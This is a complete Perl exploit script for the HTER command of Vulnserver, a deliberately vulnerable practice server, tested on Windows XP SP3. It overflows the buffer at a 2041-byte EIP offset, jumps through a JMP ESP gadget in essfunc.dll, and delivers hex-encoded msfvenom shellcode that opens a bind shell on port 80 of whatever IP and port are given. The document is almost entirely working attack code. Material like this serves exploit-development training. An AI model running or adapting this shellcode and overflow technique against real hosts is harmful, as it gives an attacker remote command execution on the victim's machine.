#!/usr/bin/perl

# Vulnserver HTER exploit (https://github.com/stephenbradshaw/vulnserver)
# Tested against Microsoft Windows XP Professional Version 2002 Service Pack 3 

use IO::Socket;

if($ARGV[1] eq ''){
die("USAGE: $0 IP_ADDRESS PORT \n\n");
}

$badheader = "HTER ";

$baddata .= "B" x (2041); # EIP offset @ 2041 bytes
$baddata .= "03125062"; # JMP ESP essfunc.dll

# msfvenom -p windows/shell_bind_tcp LPORT=80 -f hex -b "\x00" BUFFERREGISTER=ESP EXITFUNC=thread -e x86/alpha_mixed
# Payload size: 710 bytes

$payload .= "54594949494949494949494949494949494937515a6a415850304130416b41415132414232424230424241425850384142754a49596c5a486b32377065
50533075306e6938654561495045344c4b363050306c4b3142744c4c4b705242344c4b31625648644f5837426a46465651596f4e4c674c3531516c7442746c65707a617
a6f444d4551495768627872563230576c4b514246704e6b304a574c6c4b526c767170784d3342686661685143616c4b6639575053316b636e6b315937684863347a4379
6c4b37446c4b455169466471796f4c6c6f31384f666d75516a6746586970325579664333434d4968774b316d65744435397450586e6b363846444661594330666c4b766
c704b4e6b3278576c333178534e6b77744c4b45516e306b39526436445754514b714b53515149336a7271796f7970514f314f614a6e6b3672686b4e6d736d5068665354
72655053306178307774336472614f33643068326c534734664447796f78554c786a303771533065505759395452744630324871396d50324b5330396f6e35335a76686
27930505862696d33707050537066305178786a544f694f5970796f7a755a37724853324330633070506c496976535a72306366427751784842594b30375177796f3855
705772486c776a4966584b4f396f58553277535832544a4c556b4b51496f794532776f6771783075306e504d5171596f694543585533424d306435504c494a434637636
7727755616966424a7672627971464d326b4d7066495733747574774c566146616e6d5264764446705a66577061543634705071464636514663767636726e5146327631
436366506853494a6c756f4b366b4f6a754c495970626e63663736696f3470717846684d57776d71706b4f4b654f4b4d30676d446a466a706849365a354d6d6f6d696f5
a75674c7336516c466a4b30796b6b50734534454d6b526774536342524f717a633043636b4f6b654141";

$socket=IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>"$ARGV[0]",
PeerPort=>"$ARGV[1]"
)or die "Could not connect to server";

$socket->recv($sd,1024);
print $sd;
$socket->send($badheader.$baddata.$payload);
